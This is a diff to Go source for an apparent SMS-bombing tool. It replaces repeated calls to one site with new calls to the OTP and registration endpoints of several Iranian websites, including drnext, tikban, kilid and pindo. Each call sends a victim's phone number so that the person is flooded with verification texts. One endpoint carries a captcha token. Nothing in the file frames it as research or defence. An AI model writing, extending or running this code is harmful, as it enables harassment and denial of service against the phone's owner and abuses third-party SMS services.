@@ -180,33 +180,33 @@ func main() {
 		go sms("https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
 			"username": phone,
 		}, ch)  // add site
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
+		go sms("https://cyclops.drnext.ir/v1/website/patients/check-patient-exists-by-mobile?mobile=", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
+		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
+		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
+			"phoneNumber": phone,
+		}, ch)   // add site
+		go sms("https://oteacher.org/api/user/register/mobile", map[string]interface{}{
+			"mobile": phone,
+		}, ch)    // add site = captcha
+		go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
+			"phone": phone,
+		}, ch)   // add site
+		go sms("https://kilid.com/api/uaa/portal/auth/v1/otp?captchaId=akah8cgoLOvIfKnE1mx3lXOB4NrXJ0LWIXim8TTe4EETy7EKGJgAtjkFzcfF6M33i2IK8aqmJrg1X1nc59osFA%253D%253D", map[string]interface{}{
+			"": phone,
+		}, ch)   // add site
+		go sms("https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
+			"phone": phone,
+		}, ch)   // add site
+		go sms("https://roustaee.com/wp-admin/admin-ajax.php", map[string]interface{}{
+			"mobileNo": phone,
+		}, ch)   // add site
+		go sms("https://dr-ross.ir/users/CheckRegisterMobile?returnUrl=%2F", map[string]interface{}{
+			"mobile": phone,
+		}, ch)   // add site
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch) 
